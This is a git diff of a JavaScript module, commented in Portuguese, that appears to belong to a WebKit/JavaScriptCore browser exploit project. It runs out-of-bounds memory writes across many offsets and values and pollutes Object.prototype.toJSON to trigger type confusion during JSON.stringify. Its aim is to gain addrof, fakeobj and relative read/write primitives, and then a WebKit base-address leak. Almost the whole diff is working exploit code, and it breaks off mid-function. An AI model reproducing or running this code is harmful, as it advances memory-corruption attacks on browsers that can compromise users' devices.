@@ -1,32 +1,59 @@
-// js/script3/testArrayBufferVictimCrash.mjs (R43L - Getter em M2 para Addrof)
+// js/script3/testArrayBufferVictimCrash.mjs (R43L - Testes Massivos para Addrof/FakeObj)
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
 import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
 import {
     triggerOOB_primitive,
     clearOOBEnvironment,
-    arb_read,
+    arb_read, // Primitiva de leitura é crucial!
+    arb_write, // Se tivermos uma primitiva de escrita arbitrária, seria ideal! (Assumindo que existe em core_exploit.mjs)
     oob_write_absolute,
     isOOBReady,
     selfTestOOBReadWrite,
-} from '../core_exploit.mjs';
+} from '../core_exploit.mjs'; // Adicionar arb_write se disponível
 import { JSC_OFFSETS } from '../config.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R43_GetterOnM2";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R43_MassiveExploitAttempt";
 
-const VICTIM_TA_SIZE_ELEMENTS = 8; // Para o TypedArray que vai no JSON.stringify (scratchpad)
-const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC_PROBE = 0x7C;
-const OOB_WRITE_VALUE_FOR_TC = 0xABABABAB;
+const VICTIM_TA_DEFAULT_SIZE_ELEMENTS = 8; // Tamanho padrão para TypedArrays
+const VICTIM_TA_DEFAULT_BUFFER_SIZE_BYTES = VICTIM_TA_DEFAULT_SIZE_ELEMENTS * 4;
+
+// Parâmetros para Testes Massivos
+const OOB_OFFSETS_TO_TEST = [0x5C, 0x6C, 0x70, 0x74, 0x78, 0x7C, 0x80, 0x84, 0x9C];
+const OOB_VALUES_TO_TEST = [
+    0xABABABAB, 0xFFFFFFFF, 0x00000000, 0x41414141,
+    JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID, // Tentar forçar um ID de estrutura conhecido
+    // Adicionar mais StructureIDs conhecidos se disponíveis (ex: para JSString, JSObject simples)
+    // (JSC_OFFSETS.JSCell.KnownStructureIDs?.JSString_STRUCTURE_ID || 0xストラングID),
+    // (JSC_OFFSETS.JSCell.KnownStructureIDs?.JSObject_Simple_STRUCTURE_ID || 0xオブジェID),
+    // Valores que podem ser interpretados como ponteiros pequenos se a memória for desalinhada
+    // ou se corrompermos um ponteiro para que os bytes inferiores sejam esses.
+    JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET, // Se isso for escrito em um campo de ponteiro
+    JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET,
+];
+
+const FILL_PATTERN_MASSIVE_TEST = 0xFEEDBEEF;
 const PROBE_CALL_LIMIT_V82 = 10;
 
 const FUNCTION_OFFSET_TO_EXECUTABLE_INSTANCE = new AdvancedInt64(JSC_OFFSETS.JSFunction.EXECUTABLE_OFFSET);
 const ASSUMED_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM_VAL = 0x8;
 const EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM = new AdvancedInt64(ASSUMED_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM_VAL);
 
-let targetFunctionForLeak_getter_on_m2;
-let leaked_target_function_addr = null;
+let global_target_function_for_addrof_if_needed;
+let leaked_target_function_addr = null; // Endereço da função global acima
+let found_addrof_primitive = false;
+let found_fakeobj_primitive = false;
+let found_arb_rw_via_victim_ta = false;
 
-function isValidPointer(ptr, context = "") { /* ... (sem alteração) ... */
+// Objeto global para armazenar objetos cujo endereço queremos, ou para colocar objetos falsos
+let exploit_gadget_holder = {
+    target_obj_for_addrof: null,
+    fake_obj_victim: null,
+    controlled_buffer_for_fake_struct: null, // ArrayBuffer
+    controlled_view_for_fake_struct: null,   // Uint32Array view
+};
+
+function isValidPointer(ptr, context = "") { /* ... (sem alteração da última versão) ... */
     if (!isAdvancedInt64Object(ptr)) { logS3(`[isValidPointer-${context}] Input não é AdvInt64: ${String(ptr)}`, "debug_detail"); return false; }
     const high = ptr.high(); const low = ptr.low();
     if (high === 0 && low === 0) { logS3(`[isValidPointer-${context}] NULO: ${ptr.toString(true)}`, "debug_detail"); return false; }
@@ -35,21 +62,49 @@ function isValidPointer(ptr, context = "") { /* ... (sem alteração) ... */
     if (high === 0 && low < 0x10000) { logS3(`[isValidPointer-${context}] Ponteiro Baixo: ${ptr.toString(true)}`, "debug_detail"); return false; }
     return true;
 }
-function safeToHex(value, length = 8) { /* ... (sem alteração) ... */
+function safeToHex(value, length = 8) { /* ... (sem alteração da última versão) ... */
     if (typeof value === 'number') { return '0x' + (value >>> 0).toString(16).padStart(length, '0'); }
     if (value === null || value === undefined) { return String(value); }
-    return toHex(value);
+    return toHex(value); // toHex do utils.mjs
 }
+function logTypedArrayShort(ta, name = "TypedArray", max = 4) { /* ... (sem alteração da última versão) ... */
+    if (!ta || typeof ta.slice !== 'function') { return "N/A"; }
+    const content = Array.from(ta.slice(0, Math.min(ta.length, max))).map(v => `0x${(v >>> 0).toString(16)}`);
+    return `${name}[${content.join(", ")}${ta.length > max ? "..." : ""}] (len:${ta.length}, byteLen:${ta.byteLength})`;
+}
+
+
+// Função para tentar criar um objeto falso
+// Requer addrof(ArrayBuffer.prototype.data) ou similar para saber onde o buffer de dados está.
+// Ou, se tivermos arb_write, podemos construir a estrutura em qualquer lugar e apontar para ela.
+async function attemptFakeObjConstruction(base_victim_obj_addr, fake_struct_addr) {
+    // ... (Lógica complexa de fakeobj - Placeholder) ...
+    // Esta função usaria arb_write para sobrescrever o ponteiro de Structure de base_victim_obj_addr
+    // para apontar para fake_struct_addr.
+    // fake_struct_addr seria o endereço de uma Structure que construímos em exploit_gadget_holder.controlled_buffer_for_fake_struct
+    logS3(`[FakeObj] Tentativa de construir fakeobj em ${base_victim_obj_addr} com struct em ${fake_struct_addr} (NÃO IMPLEMENTADO)`, "warn");
+    return false;
+}
+
 
 export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Getter em M2 para Addrof ---`, "test", FNAME_CURRENT_TEST_BASE);
-    document.title = `${FNAME_CURRENT_TEST_BASE} Init GetterOnM2...`;
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Testes Massivos para Addrof/FakeObj ---`, "test", FNAME_CURRENT_TEST_BASE);
+    document.title = `${FNAME_CURRENT_TEST_BASE} Init Massive...`;
 
-    targetFunctionForLeak_getter_on_m2 = function someUniqueLeakFunctionR43L_GetterOnM2() { return `target_R43L_GetterOnM2_${Date.now()}`; };
+    global_target_function_for_addrof_if_needed = function someUniqueLeakFunctionR43L_MassiveTarget() { return `target_R43L_Massive_${Date.now()}`; };
     leaked_target_function_addr = null;
+    found_addrof_primitive = false;
+    found_fakeobj_primitive = false;
+    found_arb_rw_via_victim_ta = false;
 
-    logS3(`--- Fase 0 (GetterOnM2): Sanity Checks ---`, "subtest", FNAME_CURRENT_TEST_BASE);
+    // Preparar holder para estruturas falsas (exemplo)
+    exploit_gadget_holder.controlled_buffer_for_fake_struct = new ArrayBuffer(1024);
+    exploit_gadget_holder.controlled_view_for_fake_struct = new Uint32Array(exploit_gadget_holder.controlled_buffer_for_fake_struct);
+    exploit_gadget_holder.controlled_view_for_fake_struct.fill(0xDEADBEEF); // Padrão
+
+
+    logS3(`--- Fase 0 (Massive): Sanity Checks ---`, "subtest", FNAME_CURRENT_TEST_BASE);
     let coreOOBReadWriteOK = false;
     try { coreOOBReadWriteOK = await selfTestOOBReadWrite(logS3, safeToHex); }
     catch (e_sanity) { logS3(`Erro Sanity: ${e_sanity.message}`, "critical"); coreOOBReadWriteOK = false; }
@@ -58,255 +113,270 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
 
     if (!coreOOBReadWriteOK) { return { errorOccurred: "OOB Sanity Check Failed", /*...*/ }; }
 
-    let result_for_runner = {
-        errorOccurred: null, tc_probe_details: null, stringifyResult: null,
-        addrof_result: { success: false, msg: "Addrof (GetterOnM2): Não iniciado.", leaked_object_addr: null, leaked_object_addr_candidate_str: null },
-        webkit_leak_result: { success: false, msg: "WebKit Leak (GetterOnM2): Não iniciado." },
-        oob_params_used: { offset: safeToHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC_PROBE), value: safeToHex(OOB_WRITE_VALUE_FOR_TC) },
+    let iteration_results_summary = [];
+    let best_result_for_runner = {
+        errorOccurred: null, tc_probe_details: null,
+        addrof_result: { success: false, msg: "Addrof (Massive): Não obtido.", /*...*/ },
+        fakeobj_result: { success: false, msg: "FakeObj (Massive): Não obtido." },
+        webkit_leak_result: { success: false, msg: "WebKit Leak (Massive): Não obtido." },
+        oob_params_of_best_result: null,
         heisenbug_on_M2_confirmed_by_tc_probe: false,
-        getter_on_m2_addrof_details: null
+        best_corruption_details: null
     };
-    
-    let victim_ta_scratchpad = null; // O TypedArray que será usado como scratchpad
-    let m1_ref_for_sondar = null;
-    let m2_object_for_sondar = null;
+    // CORRIGIDO: Declarar final_probe_call_count_for_report no escopo correto
+    let final_probe_call_count_for_report = 0;
 
-    let getter_on_m2_addrof_attempt_details = {
-        attempted: false,
-        success: false,
-        leaked_address_str: null,
-        notes: "",
-        raw_low: null,
-        raw_high: null
-    };
 
-    let probe_call_count_iter = 0; // Corrigido: Declarar aqui
-    let tc_detected_in_probe = false;
+    // Loop principal para OOB Offsets
+    for (const current_oob_offset of OOB_OFFSETS_TO_TEST) {
+        if (found_addrof_primitive && found_fakeobj_primitive) break; // Parar se já encontramos tudo
 
-    function toJSON_TA_Probe_Iter_Closure_GetterOnM2() {
-        probe_call_count_iter++; const call_num = probe_call_count_iter;
-        const ctts = Object.prototype.toString.call(this);
-        const is_m2c = (this === m2_object_for_sondar && m2_object_for_sondar !== null);
+        // Loop interno para Valores OOB
+        for (const current_oob_value of OOB_VALUES_TO_TEST) {
+            if (found_addrof_primitive && found_fakeobj_primitive) break;
+            if (current_oob_value === null || current_oob_value === undefined) continue; // Pular valores nulos
 
-        try {
-            if (call_num > PROBE_CALL_LIMIT_V82) return { r_stop: "limit" };
+            const current_oob_hex_val = safeToHex(current_oob_value);
+            const current_offset_hex = safeToHex(current_oob_offset);
+            const FNAME_CURRENT_ITERATION = `${FNAME_CURRENT_TEST_BASE}_Off${current_offset_hex}_Val${current_oob_hex_val}`;
 
-            if (call_num === 1 && this === victim_ta_scratchpad) { // 'this' é o scratchpad na primeira chamada
-                logS3(`[PROBE_GetterOnM2] Call #${call_num}: 'this' é victim_ta_scratchpad. Configurando M1/M2...`, "debug");
-                
-                m2_object_for_sondar = { id: "M2_WITH_GETTER" };
-                logS3(`   m2_object_for_sondar criado (id: ${m2_object_for_sondar.id}).`, "debug_detail");
+            logS3(`\n===== ITERATION Massive: Offset OOB: ${current_offset_hex}, Valor OOB: ${current_oob_hex_val} =====`, "subtest", FNAME_CURRENT_ITERATION);
+            document.title = `${FNAME_CURRENT_TEST_BASE} Off:${current_offset_hex} Val:${current_oob_hex_val}`;
 
-                m1_ref_for_sondar = { marker_id_getter_on_m2: "M1_GetterOnM2", payload_M2_obj: m2_object_for_sondar };
-                return m1_ref_for_sondar;
+            let victim_ta_for_analysis = null; // TypedArray vítima para análise de corrupção
+            let iter_corruption_analysis = {
+                offset_tested: current_offset_hex, value_written: current_oob_hex_val,
+                original_length: VICTIM_TA_DEFAULT_SIZE_ELEMENTS,
+                length_after_oob: null, byteLength_after_oob: null,
+                length_corrupted: false, data_pointer_corrupted: false, // Especulativo
+                read_beyond_original_ok: null, read_beyond_value: null,
+                fill_pattern_intact: null, notes: ""
+            };
 
-            } else if (is_m2c) { // `this` é m2_object_for_sondar
-                if (!tc_detected_in_probe) {
-                    tc_detected_in_probe = true;
-                    result_for_runner.tc_probe_details = { 
-                        call_number_tc_detected: call_num, probe_variant: "TA_Probe_GetterOnM2", 
-                        this_type_actual: ctts, this_is_M2: true, 
-                        notes: "TC Confirmada. 'this' é m2_object_for_sondar. Definindo getter..."
-                    };
-                    logS3(`[PROBE_GetterOnM2] Call #${call_num} (M2C): FIRST TC. 'this' é m2_object_for_sondar (id: ${this.id}). Tipo: ${ctts}`, "vuln");
-                    
-                    // Definir o getter em 'this' (que é m2_object_for_sondar)
+            let probe_call_count_iter = 0;
+            let m1_ref = null; let m2_ref = null; // Marcadores para a sonda TC
+            let tc_detected_this_iter = false;
+            let tc_details_this_iter = null;
+
+            function massive_test_probe_toJSON() {
+                probe_call_count_iter++; const call_num = probe_call_count_iter;
+                const ctts = Object.prototype.toString.call(this);
+                const is_m2c = (this === m2_ref && m2_ref !== null);
+
+                try {
+                    if (call_num > PROBE_CALL_LIMIT_V82) return { r_stop: "limit" };
+                    if (call_num === 1 && this === victim_ta_for_analysis) {
+                        m2_ref = { id: "M2_Massive", some_prop: 123 };
+                        // Tentar colocar o objeto alvo aqui, para que se 'this' se tornar M2
+                        // e M2 for sobreposto por victim_ta_for_analysis, possamos ter uma leitura.
+                        // Isso é altamente especulativo.
+                        m2_ref.target_func_ref = global_target_function_for_addrof_if_needed;
+                        m1_ref = { id: "M1_Massive", m2: m2_ref };
+                        logS3(`[PROBE_Massive] Call #${call_num}: 'this' é victim_ta_for_analysis. M1/M2 criados.`, "debug_detail");
+                        return m1_ref;
+                    } else if (is_m2c) {
+                        if (!tc_detected_this_iter) {
+                            tc_detected_this_iter = true;
+                            tc_details_this_iter = {
+                                call_number_tc_detected: call_num, probe_variant: "MassiveProbe",
+                                this_type_actual: ctts, this_is_M2: true,
+                                m2_id: this.id, m2_some_prop: this.some_prop,
+                                m2_target_func_ref_type: typeof this.target_func_ref
+                            };
+                            logS3(`[PROBE_Massive] Call #${call_num} (M2C): FIRST TC. 'this' é M2 (id: ${this.id}). Tipo: ${ctts}`, "vuln");
+                            logS3(`    'this.target_func_ref' tipo: ${typeof this.target_func_ref}`, "info");
+
+                            // Se 'this' (M2) foi sobreposto por victim_ta_for_analysis (improvável, mas testando)
+                            // e victim_ta_for_analysis teve seu dataPointer corrompido para apontar para target_func_ref.
+                            if (victim_ta_for_analysis && victim_ta_for_analysis.length >= 2) {
+                                let val0 = victim_ta_for_analysis[0];
+                                let val1 = victim_ta_for_analysis[1];
+                                logS3(`    Dentro da TC, lendo victim_ta_for_analysis[0,1]: 0x${val0.toString(16)}, 0x${val1.toString(16)}`, "leak_detail");
+                                let potential_addr = new AdvancedInt64(val0, val1);
+                                if (val0 !== FILL_PATTERN_MASSIVE_TEST && isValidPointer(potential_addr, "_probeTCReadVictim")) {
+                                    logS3(`    !!! POTENCIAL ADDROF via victim_ta_for_analysis na sonda TC: ${potential_addr.toString(true)} !!!`, "success_major");
+                                    leaked_target_function_addr = potential_addr;
+                                    found_addrof_primitive = true; // Sinalizar sucesso
+                                    iter_corruption_analysis.notes += "Addrof especulativo via victim_ta na sonda TC bem-sucedido! ";
+                                }
+                            }
+                        }
+                        // Tentar fazer JSON.stringify ler algo do M2 que possa ser útil
+                        // Se M2 foi corrompido para ter um getter, ele seria acionado aqui.
+                        return this; // Deixar JSON.stringify continuar
+                    }
+                } catch (e_pm) { /* ... */ }
+                return { gen_m: call_num, type: ctts };
+            }
+
+            let iter_primary_error = null;
+            try {
+                await triggerOOB_primitive({ force_reinit: true, caller_fname: `${FNAME_CURRENT_ITERATION}-OOBSetup` });
+                oob_write_absolute(current_oob_offset, current_oob_value, 4);
+                logS3(`   OOB Write: ${current_oob_hex_val} @ ${current_offset_hex}`, 'info');
+                await PAUSE_S3(50);
+
+                victim_ta_for_analysis = new Uint32Array(VICTIM_TA_DEFAULT_SIZE_ELEMENTS);
+                iter_corruption_analysis.original_length = victim_ta_for_analysis.length;
+                logS3(`   Victim Uint32Array criado. Len: ${victim_ta_for_analysis.length}, ByteLen: ${victim_ta_for_analysis.byteLength}`, 'info');
+                iter_corruption_analysis.length_after_oob = victim_ta_for_analysis.length;
+                iter_corruption_analysis.byteLength_after_oob = victim_ta_for_analysis.byteLength;
+
+                if (victim_ta_for_analysis.length !== VICTIM_TA_DEFAULT_SIZE_ELEMENTS) {
+                    iter_corruption_analysis.length_corrupted = true;
+                    iter_corruption_analysis.notes += `Comprimento CORROMPIDO! (${victim_ta_for_analysis.length}). `;
+                    logS3(`   !!! COMPRIMENTO DO victim_ta_for_analysis CORROMPIDO !!! Obtido: ${victim_ta_for_analysis.length}`, "success_major");
+                    found_arb_rw_via_victim_ta = true; // Sinalizar potencial R/W
+                    // Tentar ler/escrever em índice alto
                     try {
-                        Object.defineProperty(this, 'leaky_addr_via_m2_getter', {
-                            get: function() {
-                                logS3("   [GETTER_ON_M2] Getter 'leaky_addr_via_m2_getter' ACIONADO!", "vuln_potential");
-                                getter_on_m2_addrof_attempt_details.attempted = true;
+                        const high_idx = Math.min(victim_ta_for_analysis.length - 1, 0xFFFF); // Limitar leitura
+                        let val = victim_ta_for_analysis[high_idx];
+                        iter_corruption_analysis.read_beyond_original_ok = true;
+                        iter_corruption_analysis.read_beyond_value = safeToHex(val);
+                        logS3(`   Leitura em índice alto (${high_idx}) OK: ${safeToHex(val)}`, "vuln");
+                        // Tentar escrever e ler de volta
+                        victim_ta_for_analysis[high_idx] = 0x12345678;
+                        if (victim_ta_for_analysis[high_idx] === 0x12345678) {
+                            logS3(`   Escrita/Leitura em índice alto (${high_idx}) confirmada! Primitiva R/W relativa obtida.`, "success_major");
+                            iter_corruption_analysis.notes += "R/W em índice alto confirmado! ";
+                        }
+                        victim_ta_for_analysis[high_idx] = val; // Restaurar
+                    } catch (e_high_idx) { iter_corruption_analysis.read_beyond_original_ok = false; iter_corruption_analysis.notes += `Err leitura índice alto. `; }
+                }
 
-                                if (!victim_ta_scratchpad || !victim_ta_scratchpad.buffer || victim_ta_scratchpad.buffer.byteLength < 8) {
-                                    getter_on_m2_addrof_attempt_details.notes = "Scratchpad (victim_ta_scratchpad) inválido.";
-                                    logS3("      [GETTER_ON_M2] ERRO: Scratchpad inválido.", "error");
-                                    return "getter_err_invalid_scratchpad";
-                                }
+                // Preencher e verificar padrão
+                try { victim_ta_for_analysis.fill(FILL_PATTERN_MASSIVE_TEST); /* ... (lógica de verificação de padrão) ... */
+                    let p_ok = true; for(let i=0;i<Math.min(victim_ta_for_analysis.length, VICTIM_TA_DEFAULT_SIZE_ELEMENTS);i++) if(victim_ta_for_analysis[i]!==FILL_PATTERN_MASSIVE_TEST) p_ok=false;
+                    iter_corruption_analysis.fill_pattern_intact = p_ok;
+                    if(!p_ok) {iter_corruption_analysis.notes += "Padrão não persistiu. "; logS3(` Padrão NÃO persistiu: ${logTypedArrayShort(victim_ta_for_analysis)}`,"vuln_potential");}
+                } catch(e_fill){ iter_corruption_analysis.fill_pattern_intact="exception"; iter_corruption_analysis.notes += `Err fill. `; }
 
-                                let float_view = new Float64Array(victim_ta_scratchpad.buffer);
-                                let uint32_view = new Uint32Array(victim_ta_scratchpad.buffer);
-                                const original_low = uint32_view[0];
-                                const original_high = uint32_view[1];
 
-                                try {
-                                    float_view[0] = targetFunctionForLeak_getter_on_m2;
-                                    
-                                    if (typeof float_view[0] === 'number' && isNaN(float_view[0])) {
-                                        getter_on_m2_addrof_attempt_details.notes = "Atribuição ao scratchpad resultou em NaN.";
-                                        logS3(`      [GETTER_ON_M2] AVISO: float_view[0] se tornou NaN.`, "warn");
-                                    }
+                // Sonda TC
+                const ppKey = 'toJSON'; let origDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey); let polluted = false;
+                let stringify_output_raw = null;
+                try {
+                    Object.defineProperty(Object.prototype, ppKey, { value: massive_test_probe_toJSON, writable: true, configurable: true, enumerable: false });
+                    polluted = true;
+                    stringify_output_raw = JSON.stringify(victim_ta_for_analysis);
+                    logS3(`   JSON.stringify output: ${stringify_output_raw ? stringify_output_raw.substring(0,100) : "null" }...`, "debug_detail");
+                    if (tc_detected_this_iter) logS3(`  TC Probe (Massive): TC CONFIRMADA.`, "vuln");
+                    else logS3(`  TC Probe (Massive): TC NÃO Confirmada.`, "warn");
+                } catch (e_str) { iter_primary_error = e_str; logS3(`  JSON.stringify EXCEPTION: ${e_str.message}`, "error"); }
+                finally { if (polluted) { if (origDesc) Object.defineProperty(Object.prototype, ppKey, origDesc); else delete Object.prototype[ppKey]; } }
 
-                                    const leaked_low = uint32_view[0];
-                                    const leaked_high = uint32_view[1];
-                                    getter_on_m2_addrof_attempt_details.raw_low = leaked_low;
-                                    getter_on_m2_addrof_attempt_details.raw_high = leaked_high;
+                // Se addrof foi obtido na sonda TC, tentar WebKitLeak
+                if (found_addrof_primitive && leaked_target_function_addr) {
+                     // ... (Lógica WebKitLeak, usando leaked_target_function_addr)
+                    // Certifique-se que o objeto em leaked_target_function_addr é uma função para esta lógica funcionar.
+                    // Se for outro tipo de objeto, a lógica de WebKitLeak precisa ser adaptada.
+                    logS3(`  ADDROF OBTIDO (${leaked_target_function_addr.toString(true)})! Tentando WebKitLeak... (NOTA: leaked_target_function_addr pode não ser uma função)`);
+                    // A lógica padrão de WebKitLeak espera o endereço de uma JSFunction.
+                    // Se leaked_target_function_addr for de outro tipo, isso pode falhar ou precisar de adaptação.
+                    // Por enquanto, apenas registramos o addrof.
+                    best_result_for_runner.addrof_result = { success: true, msg: `Addrof obtido especulativamente via TC: ${leaked_target_function_addr.toString(true)}`, leaked_object_addr: leaked_target_function_addr.toString(true) };
 
-                                    const potential_addr = new AdvancedInt64(leaked_low, leaked_high);
-                                    getter_on_m2_addrof_attempt_details.leaked_address_str = potential_addr.toString(true);
-                                    logS3(`      [GETTER_ON_M2] Raw Addrof: L=0x${leaked_low.toString(16)}, H=0x${leaked_high.toString(16)} -> ${potential_addr.toString(true)}`, "leak");
+                }
 
-                                    if (isValidPointer(potential_addr, "_getterOnM2Addrof")) {
-                                        leaked_target_function_addr = potential_addr;
-                                        getter_on_m2_addrof_attempt_details.success = true;
-                                        getter_on_m2_addrof_attempt_details.notes = "Addrof via Getter em M2 BEM SUCEDIDO!";
-                                        logS3(`      [GETTER_ON_M2] !!! ADDROF BEM SUCEDIDO: ${potential_addr.toString(true)} !!!`, "success_major");
-                                        return "getter_addrof_success";
-                                    } else {
-                                        getter_on_m2_addrof_attempt_details.notes += " Endereço vazado não é ponteiro válido.";
-                                        logS3(`      [GETTER_ON_M2] Endereço vazado (${potential_addr.toString(true)}) não é ponteiro válido.`, "warn");
-                                        return "getter_addrof_invalid_ptr";
-                                    }
-                                } catch (e_addrof_getter) {
-                                    getter_on_m2_addrof_attempt_details.notes += ` Exceção: ${e_addrof_getter.message}`;
-                                    logS3(`      [GETTER_ON_M2] Exceção: ${e_addrof_getter.message}`, "error");
-                                    return "getter_addrof_exception";
-                                } finally {
-                                    uint32_view[0] = original_low; // Restaurar scratchpad
-                                    uint32_view[1] = original_high;
-                                }
-                            },
-                            enumerable: true, configurable: true
-                        });
-                        logS3(`   Getter 'leaky_addr_via_m2_getter' definido em 'this' (m2_object_for_sondar).`, "debug");
-                    } catch (e_def_getter) {
-                         logS3(`   ERRO ao definir getter em 'this' (m2_object_for_sondar): ${e_def_getter.message}`, "error");
-                         if (result_for_runner.tc_probe_details) result_for_runner.tc_probe_details.error_probe = `DefineGetterErr: ${e_def_getter.message}`;
+
+            } catch (e_outer_iter) { iter_primary_error = e_outer_iter; }
+            finally { await clearOOBEnvironment({ caller_fname: `${FNAME_CURRENT_ITERATION}-FinalClear` }); }
+
+            final_probe_call_count_for_report = probe_call_count_iter;
+            let current_iter_summary = {
+                oob_offset: current_offset_hex, oob_value: current_oob_hex_val,
+                raw_oob_offset: current_oob_offset, raw_oob_value: current_oob_value,
+                error: iter_primary_error ? (iter_primary_error.message || String(iter_primary_error)) : null,
+                tc_probe_details: tc_details_this_iter,
+                corruption_analysis: iter_corruption_analysis,
+                addrof_success_this_iter: found_addrof_primitive, // Se addrof foi encontrado nesta iteração
+                fakeobj_success_this_iter: found_fakeobj_primitive, // Se fakeobj foi encontrado
+                arb_rw_via_victim_ta_this_iter: found_arb_rw_via_victim_ta,
+                heisenbug_on_M2_confirmed_by_tc_probe: tc_detected_this_iter
+            };
+            iteration_results_summary.push(current_iter_summary);
+
+            // Lógica para atualizar best_result_for_runner
+            if (current_iter_summary.error === null) {
+                let current_is_better = false;
+                const cur_len_corrupt = current_iter_summary.corruption_analysis.length_corrupted;
+                const cur_tc = current_iter_summary.heisenbug_on_M2_confirmed_by_tc_probe;
+                const cur_addrof = current_iter_summary.addrof_success_this_iter;
+
+                if (best_result_for_runner.oob_params_of_best_result === null) current_is_better = true;
+                else {
+                    const best_len_corrupt = best_result_for_runner.best_corruption_details?.length_corrupted;
+                    const best_tc = best_result_for_runner.heisenbug_on_M2_confirmed_by_tc_probe;
+                    const best_addrof = best_result_for_runner.addrof_result.success;
+
+                    if (cur_addrof && !best_addrof) current_is_better = true;
+                    else if (cur_addrof === best_addrof) {
+                        if (cur_len_corrupt && !best_len_corrupt) current_is_better = true;
+                        else if (cur_len_corrupt === best_len_corrupt) {
+                            if (cur_tc && !best_tc) current_is_better = true;
+                        }
                     }
                 }
-                // Fazer JSON.stringify ler a propriedade para acionar o getter
-                return this; 
-            }
-        } catch (e_pm) { 
-            if (result_for_runner.tc_probe_details) result_for_runner.tc_probe_details.error_probe = `ProbeMainErr:${e_pm.message}`;
-            else result_for_runner.tc_probe_details = {error_probe: `ProbeMainErrEarly:${e_pm.message}`};
-            console.error("[PROBE_GetterOnM2] Erro:", e_pm); return { err_pm: call_num, msg: e_pm.message };
-        }
-        return { gen_m: call_num, type: ctts };
-    }
-
-    let iter_primary_error = null;
-    let iter_raw_stringify_output = null;
-
-    try {
-        logS3(`  --- Fase 1 (GetterOnM2): Configuração e Trigger da TC ---`, "subtest", FNAME_CURRENT_TEST_BASE);
-        victim_ta_scratchpad = new Uint32Array(VICTIM_TA_SIZE_ELEMENTS); // Usado como scratchpad
-        victim_ta_scratchpad.fill(0); // Limpar
-        logS3(`   victim_ta_scratchpad criado. Length: ${victim_ta_scratchpad.length}`, "info");
-
-        await triggerOOB_primitive({ force_reinit: true, caller_fname: `${FNAME_CURRENT_TEST_BASE}-OOBSetup` });
-        oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC_PROBE, OOB_WRITE_VALUE_FOR_TC, 4);
-        logS3(`   OOB Write: ${safeToHex(OOB_WRITE_VALUE_FOR_TC)} @ ${safeToHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC_PROBE)}`, 'info');
-        await PAUSE_S3(150);
-
-        logS3(`  --- Tentativa de Detecção de TC e Addrof via Getter em M2 ---`, "subtest", FNAME_CURRENT_TEST_BASE);
-        const ppKey = 'toJSON'; let origDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey); let polluted = false;
-        try {
-            Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_Iter_Closure_GetterOnM2, writable: true, configurable: true, enumerable: false });
-            polluted = true;
-            
-            iter_raw_stringify_output = JSON.stringify(victim_ta_scratchpad); 
-            result_for_runner.stringifyResult = iter_raw_stringify_output;
-            logS3(`   JSON.stringify raw output: ${iter_raw_stringify_output}`, "leak_detail");
-
-            result_for_runner.heisenbug_on_M2_confirmed_by_tc_probe = tc_detected_in_probe;
-            if (tc_detected_in_probe) {
-                logS3(`  TC Probe (GetterOnM2): TC CONFIRMADA.`, "vuln");
-            } else {
-                logS3(`  TC Probe (GetterOnM2): TC NÃO Confirmada.`, "warn");
-            }
-        } catch (e_str) {
-            if (!iter_primary_error) iter_primary_error = e_str;
-            logS3(`  TC Probe (GetterOnM2): JSON.stringify EXCEPTION: ${e_str.message}`, "error");
-            result_for_runner.stringifyResult = { error_during_stringify: e_str.message };
-        } finally {
-            if (polluted) { if (origDesc) Object.defineProperty(Object.prototype, ppKey, origDesc); else delete Object.prototype[ppKey]; }
-        }
-        
-        result_for_runner.getter_on_m2_addrof_details = getter_on_m2_addrof_attempt_details;
-        if (getter_on_m2_addrof_attempt_details.success) {
-             logS3(`  Addrof via Getter em M2 teve sucesso: ${getter_on_m2_addrof_attempt_details.leaked_address_str}`, "success_major");
-             result_for_runner.addrof_result.success = true;
-             result_for_runner.addrof_result.msg = "Addrof bem-sucedido via Getter em M2.";
-             result_for_runner.addrof_result.leaked_object_addr = getter_on_m2_addrof_attempt_details.leaked_address_str;
-             result_for_runner.addrof_result.leaked_object_addr_candidate_str = getter_on_m2_addrof_attempt_details.leaked_address_str;
-        } else {
-             logS3(`  Addrof via Getter em M2 falhou. Notas: ${getter_on_m2_addrof_attempt_details.notes}`, "warn");
-             result_for_runner.addrof_result.msg = `Addrof via Getter em M2 falhou: ${getter_on_m2_addrof_attempt_details.notes}`;
-        }
-        
-        logS3(`  --- Fase de TC e Addrof via Getter em M2 Concluída. TC: ${tc_detected_in_probe} ---`, "subtest", FNAME_CURRENT_TEST_BASE);
-        await PAUSE_S3(100);
-
-        if (result_for_runner.addrof_result.success && leaked_target_function_addr) {
-            logS3(`  --- Fase 2 (GetterOnM2): Teste de WebKit Base Leak ---`, "subtest", FNAME_CURRENT_TEST_BASE);
-            // ... (Lógica do WebKitLeak idêntica ao script anterior bem-sucedido)
-            if (!isOOBReady(`${FNAME_CURRENT_TEST_BASE}-PreArbReadCheck`)) { await triggerOOB_primitive({ force_reinit: true, caller_fname: `${FNAME_CURRENT_TEST_BASE}-PreArbReadCheckReinit` }); }
